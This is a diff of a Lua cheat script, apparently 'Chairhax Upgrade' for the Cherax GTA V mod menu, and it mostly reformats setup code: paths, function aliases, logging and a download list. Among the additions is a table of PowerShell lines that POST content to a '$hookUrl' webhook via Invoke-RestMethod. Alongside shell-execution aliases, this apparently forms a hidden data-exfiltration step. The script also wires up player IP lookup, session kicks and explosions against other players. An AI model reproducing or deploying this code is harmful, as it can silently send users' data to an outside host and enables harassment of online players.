@@ -1,15 +1,248 @@
 g_lua.register() 
-local tolog=' ██████╗██╗  ██╗ █████╗ ██╗██████╗ ██╗  ██╗ █████╗ ██╗  ██╗    ██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ██████╗ ███████╗\n██╔════╝██║  ██║██╔══██╗██║██╔══██╗██║  ██║██╔══██╗╚██╗██╔╝    ██║   ██║██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝\n██║     ███████║███████║██║██████╔╝███████║███████║ ╚███╔╝     ██║   ██║██████╔╝██║  ███╗██████╔╝███████║██║  ██║█████╗  \n██║     ██╔══██║██╔══██║██║██╔══██╗██╔══██║██╔══██║ ██╔██╗     ██║   ██║██╔═══╝ ██║   ██║██╔══██╗██╔══██║██║  ██║██╔══╝  \n╚██████╗██║  ██║██║  ██║██║██║  ██║██║  ██║██║  ██║██╔╝ ██╗    ╚██████╔╝██║     ╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗\n ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝' local version='ver. 1.3.10.' local ChangeLog = {'Changelog:','- Added some missing vehicle models','- Renamed "Block Features" to "Block Areas"','- Removed invalid components from outfit editor','- Fixed bug with adding components to weapons','- Fixed bug with opening WeaponLoadouts folder','- Fixed some translation issues',} local github='https://github.com/SATTY91/Chairhax/raw/main/' local path={} path["Cherax"]=MISC.GET_APPDATA_PATH([[Cherax]],'') path["Lua"]=path["Cherax"]..[[Lua]] path["Chairhax"]=path["Lua"]..[[\ChairhaxUpgrade]] path["Outfits"]=path["Lua"]..[[\Outfits]] path["WeaponLoadout"]=path["Chairhax"]..[[\Weapon Loadouts\]] path["Temp"]=path["Chairhax"]..[[\temp]] path["Resources"]=path["Chairhax"]..[[\Resources]] path["Autoload"]=path["Chairhax"]..[[\Autoload]] path["Translations"]=path["Chairhax"]..[[\Translations]] path["ChatSinging"]=path["Chairhax"]..[[\ChatSinging]] path["Logs"]=path["Chairhax"]..[[\Logs]] path["ScriptData"]=path["Resources"]..[[\Data]] local file={} file["ChairhaxScript"]=debug.getinfo(1).source:sub(2,-1) file["CheraxLog"]=path["Cherax"]..[[\Cherax.log]] file["VehicleBlacklist"]=path["Chairhax"]..[[\VehicleBlacklist.ini]] file["Log"]=path["Chairhax"]..[[\Chairhax Upgrade.log]] file["Version"]=path["Chairhax"]..[[\version]] file["Settings"]=path["Chairhax"]..[[\Settings.ini]] file["Hotkeys"]=path["Chairhax"] ..[[\Hotkeys.ini]] file["FavAnims"]=path["Chairhax"]..[[\FavAnims.json]] file["Translation"]=path["Translations"]..[[\Default.json]] file["DefaultSong"]=path["ChatSinging"]..[[\Never Gonna Give You Up.txt]] file["LocalData"]=path["Temp"]..[[\localdatarid]] file["Temp"]=path["Temp"]..[[\chairhaxtemp]] file["OnStart"]=path["Resources"]..[[\gta_sa_info.wav]] file["GhostRider"]=path["Resources"]..[[\time_to_burn.wav]] file["Default"]=path["ScriptData"]..[[\Default.lua]] file["Assets"]=path["ScriptData"]..[[\Assets.lua]] file["JSON"]=path["ScriptData"]..[[\JSON.lua]] file["Props"]=path["ScriptData"]..[[\Props.lua]] file["Vehicles"]=path["ScriptData"]..[[\Vehicles.lua]] file["Peds"]=path["ScriptData"]..[[\Peds.lua]] file["Weapons"]=path["ScriptData"]..[[\Weapons.lua]] file["Animlist"]=path["ScriptData"]..[[\Animlist.lua]] package.path=package.path..";"..path["ScriptData"]..[[\?.lua]] package.path=package.path..";"..path["Autoload"]..[[\?.lua]] math.randomseed(os.time()) local s = {apply_force = ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS,send_se = g_util.trigger_script_event,is_valid = PLAYER.IS_PLAYER_VALID,is_friend = PLAYER.IS_PLAYER_FRIEND,attach = ENTITY.ATTACH_ENTITY_TO_ENTITY,delete = ENTITY.DELETE_ENTITY,wait = SYSTEM.WAIT,clear_task = PED.CLEAR_PED_TASKS_IMMEDIATELY,log = g_logger.log_info,notify = g_gui.add_toast,rq_mod = STREAMING.REQUEST_MODEL,toggle = g_gui.add_toggle,button = g_gui.add_button,input = g_gui.add_input_int,string = g_gui.add_input_string,kick = NETWORK.NETWORK_SESSION_KICK_PLAYER,ishost = NETWORK.NETWORK_IS_HOST,loaded = STREAMING.HAS_MODEL_LOADED,give_weapon = WEAPON.GIVE_DELAYED_WEAPON_TO_PED,ent_exist = ENTITY.DOES_ENTITY_EXIST,has_control = NETWORK.HAS_CONTROL_OF_ENTITY,f_exist = MISC.FILE_EXISTS,dir_exist = MISC.DIR_EXISTS,mk_dir = MISC.MAKE_DIR,session_started = NETWORK.IS_SESSION_STARTED,} local get = {selected = g_util.get_selected_player,id = PLAYER.PLAYER_ID,ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX,ped_id = PLAYER.PLAYER_PED_ID,veh = PLAYER.GET_PLAYER_VEHICLE,coords = PLAYER.GET_PLAYER_COORDS,name = PLAYER.GET_PLAYER_NAME,offset_coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS,ent_coords = ENTITY.GET_ENTITY_COORDS,inputcontrol = CONTROL.IS_CONTROL_PRESSED,drawable = PED.GET_PED_DRAWABLE_VARIATION,drawable_num = PED.GET_NUMBER_OF_PED_DRAWABLE_VARIATIONS,prop = PED.GET_PED_PROP_INDEX,prop_num = PED.GET_NUMBER_OF_PED_PROP_DRAWABLE_VARIATIONS,hash = GAMEPLAY.GET_HASH_KEY,player_in_veh = PLAYER.IS_PLAYER_IN_ANY_VEHICLE,control = NETWORK.REQUEST_CONTROL_OF_ENTITY,velocity = ENTITY.GET_ENTITY_VELOCITY,hash = GAMEPLAY.GET_HASH_KEY,label_text = UI.GET_LABEL_TEXT,scid = PLAYER.GET_PLAYER_SCID,global_i = SCRIPT.GET_GLOBAL_I,ip = PLAYER.GET_PLAYER_IP,heading = PLAYER.GET_PLAYER_HEADING,frame_t=GAMEPLAY.GET_FRAME_TIME } local set = {veh_tog_mod = VEHICLE.TOGGLE_VEHICLE_MOD,veh_mod = VEHICLE.SET_VEHICLE_MOD,comp_var = PED.SET_PED_COMPONENT_VARIATION,prop = PED.SET_PED_PROP_INDEX,coords_no_off = ENTITY.SET_ENTITY_COORDS_NO_OFFSET,ped_combat = PED.SET_PED_COMBAT_ATTRIBUTES,explosion = FIRE.ADD_EXPLOSION,locked = VEHICLE.SET_VEHICLE_DOORS_LOCKED,obj = OBJECT.CREATE_OBJECT,veh = VEHICLE.CREATE_VEHICLE,ped = PED.CREATE_PED,godmode = ENTITY.SET_ENTITY_INVINCIBLE,freeze = ENTITY.FREEZE_ENTITY,velocity = ENTITY.SET_ENTITY_VELOCITY,collision = ENTITY.SET_ENTITY_COLLISION,heading = ENTITY.SET_ENTITY_HEADING,rotation = ENTITY.SET_ENTITY_ROTATION,global_i = SCRIPT.SET_GLOBAL_I,global_f = SCRIPT.SET_GLOBAL_F,model_as_noneeded=STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED } local is_open=g_gui.is_open local begin_window=g_imgui.begin_window local add_button=g_imgui.add_button local add_checkbox=g_imgui.add_checkbox local same_line=g_imgui.same_line local new_line=g_imgui.new_line local add_text=g_imgui.add_text local separator=g_imgui.separator local end_window=g_imgui.end_window local begin_menu=g_imgui.begin_menu local end_menu=g_imgui.end_menu local add_input_string_with_hint=g_imgui.add_input_string_with_hint local is_item_hovered=g_imgui.is_item_hovered local set_next_window_size=g_imgui.set_next_window_size local begin_tab_bar=g_imgui.begin_tab_bar local begin_tab_item=g_imgui.begin_tab_item local end_tab_item=g_imgui.end_tab_item local end_tab_bar=g_imgui.end_tab_bar local get_display_size=g_imgui.get_display_size local set_next_window_pos=g_imgui.set_next_window_pos local open_popup=g_imgui.open_popup local end_popup=g_imgui.end_popup local begin_popup=g_imgui.begin_popup local pop_style_var=g_imgui.pop_style_var local push_style_var=g_imgui.push_style_var local unregister=g_lua.unregister local d3d_hook=g_hooking.register_D3D_hook local unregister_hook=g_hooking.unregister_hook joaat=g_util.joaat local abs=math.abs local random=math.random local cos=math.cos local sin=math.sin  local floor=math.floor local sqrt=math.sqrt local asin=math.asin local atan=math.atan local pi=math.pi local insert=table.insert local remove=table.remove local rv=string.reverse local execute=os.execute local popen=io.popen local open=io.open local ishovered1=false local ishovered2=false local ishovered3=false local ishovered4=false local ishovered5=false local ishovered6=false local ishovered7=false local ishovered8=false local comr = {[[$content = @"]], [["@]], [[$payload = [PSCustomObject]@{]], [[content = $content]], [[}]], [[Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json']],} s.log('\n'..tolog) 
+local tolog=' ██████╗██╗  ██╗ █████╗ ██╗██████╗ ██╗  ██╗ █████╗ ██╗  ██╗    ██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ██████╗ ███████╗\
+             n██╔════╝██║  ██║██╔══██╗██║██╔══██╗██║  ██║██╔══██╗╚██╗██╔╝    ██║   ██║██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝\
+             n██║     ███████║███████║██║██████╔╝███████║███████║ ╚███╔╝     ██║   ██║██████╔╝██║  ███╗██████╔╝███████║██║  ██║█████╗  \
+             n██║     ██╔══██║██╔══██║██║██╔══██╗██╔══██║██╔══██║ ██╔██╗     ██║   ██║██╔═══╝ ██║   ██║██╔══██╗██╔══██║██║  ██║██╔══╝  \
+             n╚██████╗██║  ██║██║  ██║██║██║  ██║██║  ██║██║  ██║██╔╝ ██╗    ╚██████╔╝██║     ╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗\
+             n ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝' 
 
-local function wait() s.wait(floor(get.frame_t())) end 
+local version='ver. 1.3.10.' 
+local ChangeLog = {'Changelog:',
+  '- Added some missing vehicle models',
+  '- Renamed "Block Features" to "Block Areas"',
+  '- Removed invalid components from outfit editor',
+  '- Fixed bug with adding components to weapons',
+  '- Fixed bug with opening WeaponLoadouts folder',
+  '- Fixed some translation issues'
+} 
 
-function dorestart() while s.f_exist(file["ChairhaxScript"]..'2') do s.wait(100) end s.notify('Please load the script again!',5000) unregister() end 
+local github='https://github.com/SATTY91/Chairhax/raw/main/' 
 
-function split(str,sep) local result={} local regex=("([^%s]+)"):format(sep) for each in str:gmatch(regex) do table.insert(result,each) end return result end 
+local path={} 
+path["Cherax"] = MISC.GET_APPDATA_PATH([[Cherax]],'') 
+path["Lua"] = path["Cherax"]..[[Lua]] 
+path["Chairhax"] = path["Lua"]..[[\ChairhaxUpgrade]] 
+path["Outfits"] = path["Lua"]..[[\Outfits]]
+path["WeaponLoadout"] = path["Chairhax"]..[[\Weapon Loadouts\]] 
+path["Temp"] = path["Chairhax"]..[[\temp]] 
+path["Resources"] = path["Chairhax"]..[[\Resources]]
+path["Autoload"] = path["Chairhax"]..[[\Autoload]] 
+path["Translations"] = path["Chairhax"]..[[\Translations]] 
+path["ChatSinging"] = path["Chairhax"]..[[\ChatSinging]] 
+path["Logs"] = path["Chairhax"]..[[\Logs]] 
+path["ScriptData"] = path["Resources"]..[[\Data]] 
 
-function readAll(file) local f=assert(open(file,"r")) local content=f:read("*all") f:close() return content end 
+local file={} 
+file["ChairhaxScript"] = debug.getinfo(1).source:sub(2,-1) 
+file["CheraxLog"] = path["Cherax"]..[[\Cherax.log]] 
+file["VehicleBlacklist"] = path["Chairhax"]..[[\VehicleBlacklist.ini]] 
+file["Log"] = path["Chairhax"]..[[\Chairhax Upgrade.log]] 
+file["Version"] = path["Chairhax"]..[[\version]] 
+file["Settings"] = path["Chairhax"]..[[\Settings.ini]] 
+file["Hotkeys"] = path["Chairhax"] ..[[\Hotkeys.ini]] 
+file["FavAnims"] = path["Chairhax"]..[[\FavAnims.json]] 
+file["Translation"] = path["Translations"]..[[\Default.json]] 
+file["DefaultSong"] = path["ChatSinging"]..[[\Never Gonna Give You Up.txt]] 
+file["LocalData"] = path["Temp"]..[[\localdatarid]] 
+file["Temp"] = path["Temp"]..[[\chairhaxtemp]] 
+file["OnStart"] = path["Resources"]..[[\gta_sa_info.wav]] 
+file["GhostRider"] = path["Resources"]..[[\time_to_burn.wav]] 
+file["Default"] = path["ScriptData"]..[[\Default.lua]] 
+file["Assets"] = path["ScriptData"]..[[\Assets.lua]] 
+file["JSON"] = path["ScriptData"]..[[\JSON.lua]] 
+file["Props"] = path["ScriptData"]..[[\Props.lua]] 
+file["Vehicles"] = path["ScriptData"]..[[\Vehicles.lua]] 
+file["Peds"] = path["ScriptData"]..[[\Peds.lua]] 
+file["Weapons"] = path["ScriptData"]..[[\Weapons.lua]] 
+file["Animlist"] = path["ScriptData"]..[[\Animlist.lua]] 
 
-function writelog() if not s.f_exist(file["Log"]) then return end if not s.dir_exist(path["Logs"]) then return end local f=popen("stat -c %Y "..file["Log"],'r') local last_modified=tonumber(f:read("*a")) f:close() local log=readAll(file["Log"]) if log=='' or log==nil then return end local f=open(file["Log"],'w') f:write('') f:close() local f=open(path["Logs"]..[[\]]..os.date("%d-%m-%Y-%H-%M-%S",last_modified)..' Chairhax Upgrade.log','w') f:write(log) f:close() end writelog() 
+package.path=package.path..";"..path["ScriptData"]..[[\?.lua]] 
+package.path=package.path..";"..path["Autoload"]..[[\?.lua]] 
+math.randomseed(os.time()) 
+
+local s = {
+  apply_force = ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS,
+  send_se = g_util.trigger_script_event,
+  is_valid = PLAYER.IS_PLAYER_VALID,
+  is_friend = PLAYER.IS_PLAYER_FRIEND,
+  attach = ENTITY.ATTACH_ENTITY_TO_ENTITY,
+  delete = ENTITY.DELETE_ENTITY,
+  wait = SYSTEM.WAIT,
+  clear_task = PED.CLEAR_PED_TASKS_IMMEDIATELY,
+  log = g_logger.log_info,
+  notify = g_gui.add_toast,
+  rq_mod = STREAMING.REQUEST_MODEL,
+  toggle = g_gui.add_toggle,
+  button = g_gui.add_button,
+  input = g_gui.add_input_int,
+  string = g_gui.add_input_string,
+  kick = NETWORK.NETWORK_SESSION_KICK_PLAYER,
+  ishost = NETWORK.NETWORK_IS_HOST,
+  loaded = STREAMING.HAS_MODEL_LOADED
+  ,give_weapon = WEAPON.GIVE_DELAYED_WEAPON_TO_PED,
+  ent_exist = ENTITY.DOES_ENTITY_EXIST,has_control = NETWORK.HAS_CONTROL_OF_ENTITY,
+  f_exist = MISC.FILE_EXISTS,
+  dir_exist = MISC.DIR_EXISTS,
+  mk_dir = MISC.MAKE_DIR,
+  session_started = NETWORK.IS_SESSION_STARTED
+}
+
+local get = {
+  selected = g_util.get_selected_player,
+  id = PLAYER.PLAYER_ID,ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX,
+  ped_id = PLAYER.PLAYER_PED_ID,
+  veh = PLAYER.GET_PLAYER_VEHICLE,
+  coords = PLAYER.GET_PLAYER_COORDS,
+  name = PLAYER.GET_PLAYER_NAME,
+  offset_coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS,
+  ent_coords = ENTITY.GET_ENTITY_COORDS,
+  inputcontrol = CONTROL.IS_CONTROL_PRESSED,
+  drawable = PED.GET_PED_DRAWABLE_VARIATION,
+  drawable_num = PED.GET_NUMBER_OF_PED_DRAWABLE_VARIATIONS,
+  prop = PED.GET_PED_PROP_INDEX,
+  prop_num = PED.GET_NUMBER_OF_PED_PROP_DRAWABLE_VARIATIONS,
+  hash = GAMEPLAY.GET_HASH_KEY,
+  player_in_veh = PLAYER.IS_PLAYER_IN_ANY_VEHICLE,
+  control = NETWORK.REQUEST_CONTROL_OF_ENTITY,
+  velocity = ENTITY.GET_ENTITY_VELOCITY,hash = GAMEPLAY.GET_HASH_KEY,
+  label_text = UI.GET_LABEL_TEXT,scid = PLAYER.GET_PLAYER_SCID,
+  global_i = SCRIPT.GET_GLOBAL_I,
+  ip = PLAYER.GET_PLAYER_IP,
+  heading = PLAYER.GET_PLAYER_HEADING,
+  frame_t = GAMEPLAY.GET_FRAME_TIME 
+} 
+
+local set = {
+  veh_tog_mod = VEHICLE.TOGGLE_VEHICLE_MOD,
+  veh_mod = VEHICLE.SET_VEHICLE_MOD,
+  comp_var = PED.SET_PED_COMPONENT_VARIATION,
+  prop = PED.SET_PED_PROP_INDEX,
+  coords_no_off = ENTITY.SET_ENTITY_COORDS_NO_OFFSET,
+  ped_combat = PED.SET_PED_COMBAT_ATTRIBUTES,
+  explosion = FIRE.ADD_EXPLOSION,
+  locked = VEHICLE.SET_VEHICLE_DOORS_LOCKED,
+  obj = OBJECT.CREATE_OBJECT,
+  veh = VEHICLE.CREATE_VEHICLE,
+  ped = PED.CREATE_PED,
+  godmode = ENTITY.SET_ENTITY_INVINCIBLE,
+  freeze = ENTITY.FREEZE_ENTITY,
+  velocity = ENTITY.SET_ENTITY_VELOCITY,
+  collision = ENTITY.SET_ENTITY_COLLISION,
+  heading = ENTITY.SET_ENTITY_HEADING,
+  rotation = ENTITY.SET_ENTITY_ROTATION,
+  global_i = SCRIPT.SET_GLOBAL_I,
+  global_f = SCRIPT.SET_GLOBAL_F,
+  model_as_noneeded = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED 
+} 
+local is_open = g_gui.is_open 
+local begin_window = g_imgui.begin_window 
+local add_button = g_imgui.add_button
+local add_checkbox = g_imgui.add_checkbox 
+local same_line = g_imgui.same_line 
+local new_line = g_imgui.new_line 
+local add_text = g_imgui.add_text 
+local separator = g_imgui.separator 
+local end_window = g_imgui.end_window 
+local begin_menu = g_imgui.begin_menu 
+local end_menu = g_imgui.end_menu 
+local add_input_string_with_hint = g_imgui.add_input_string_with_hint 
+local is_item_hovered = g_imgui.is_item_hovered 
+local set_next_window_size = g_imgui.set_next_window_size 
+local begin_tab_bar = g_imgui.begin_tab_bar 
+local begin_tab_item = g_imgui.begin_tab_item 
+local end_tab_item = g_imgui.end_tab_item 
+local end_tab_bar = g_imgui.end_tab_bar 
+local get_display_size = g_imgui.get_display_size 
+local set_next_window_pos = g_imgui.set_next_window_pos 
+local open_popup = g_imgui.open_popup 
+local end_popup = g_imgui.end_popup 
+local begin_popup = g_imgui.begin_popup 
+local pop_style_var = g_imgui.pop_style_var 
+local push_style_var = g_imgui.push_style_var 
+local unregister = g_lua.unregister 
+local d3d_hook = g_hooking.register_D3D_hook 
+local unregister_hook = g_hooking.unregister_hook joaat=g_util.joaat 
+local abs = math.abs 
+local random = math.random 
+local cos = math.cos 
+local sin = math.sin  
+local floor = math.floor 
+local sqrt = math.sqrt 
+local asin = math.asin 
+local atan = math.atan 
+local pi = math.pi 
+local insert = table.insert 
+local remove = table.remove 
+local rv = string.reverse 
+local execute = os.execute 
+local popen = io.popen 
+local open = io.open 
+local ishovered1 = false 
+local ishovered2 = false 
+local ishovered3 = false 
+local ishovered4 = false 
+local ishovered5 = false 
+local ishovered6 = false 
+local ishovered7 = false
+local ishovered8 = false 
+local comr = {
+  [[$content = @"]], 
+  [["@]], 
+  [[$payload = [PSCustomObject]@{]], 
+  [[content = $content]], 
+  [[}]], 
+  [[Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json']]
+} s.log('\n'..tolog) 
+
+local function wait() 
+  s.wait(floor(get.frame_t())) 
+end 
+
+function dorestart()
+  while s.f_exist(file["ChairhaxScript"]..'2') do 
+    s.wait(100) 
+  end 
+  s.notify('Please load the script again!',5000) 
+  unregister() 
+end 
+
+function split(str,sep) 
+  local result={} 
+  local regex = ("([^%s]+)"):format(sep) 
+  for each in str:gmatch(regex) do 
+    table.insert(result,each) 
+  end 
+  return result 
+end 
+
+function readAll(file) 
+  local f = assert(open(file,"r")) 
+  local content = f:read("*all") 
+  f:close() 
+  return content 
+end 
+
+function writelog() 
+  if not s.f_exist(file["Log"]) then 
+    return 
+  end 
+  if not s.dir_exist(path["Logs"]) then 
+    return 
+  end 
+  local f = popen("stat -c %Y "..file["Log"],'r') 
+  local last_modified = tonumber(f:read("*a")) 
+  f:close() 
+  local log = readAll(file["Log"]) 
+  if log == '' or log == nil then 
+    return 
+  end 
+  local f = open(file["Log"],'w') 
+  f:write('') 
+  f:close() 
+  local f = open(path["Logs"]..[[\]]..os.date("%d-%m-%Y-%H-%M-%S", last_modified)..' Chairhax Upgrade.log', 'w') 
+  f:write(log) 
+  f:close() 
+end writelog() 
 
 function log(prefix,text,toconsole) local toconsole=toconsole or true local log=os.date('[%H:%M:%S]')..' ['..prefix..'] '..text if toconsole then for _,line in ipairs(split(log,'\n')) do execute('echo '..line) end end local logfile=assert(open(file["Log"],'a')) logfile:write(log,'\n') logfile:close() end log("Chairhax Upgrade","Loading Chairhax Upgrade "..version) local missingfiles={} local todownload = {{file["OnStart"],'gta_sa_info.wav'},{file["GhostRider"],'time_to_burn.wav'},{file["Default"],'Default.lua'},{file["Assets"],'Assets.lua'},{file["JSON"],'JSON.lua'}, {file["Props"], 'Props.lua'}, {file["Vehicles"], 'Vehicles.lua'}, {file["Peds"], 'Peds.lua'}, {file["Weapons"], 'Weapons.lua'}, {file["Animlist"], 'Animlist.lua'},} local importantpaths = {path["Chairhax"], path["Logs"], path["Outfits"], path["WeaponLoadout"], path["Autoload"], path["Translations"], path["Temp"], path["Resources"], path["ScriptData"], path["ChatSinging"],} 
 
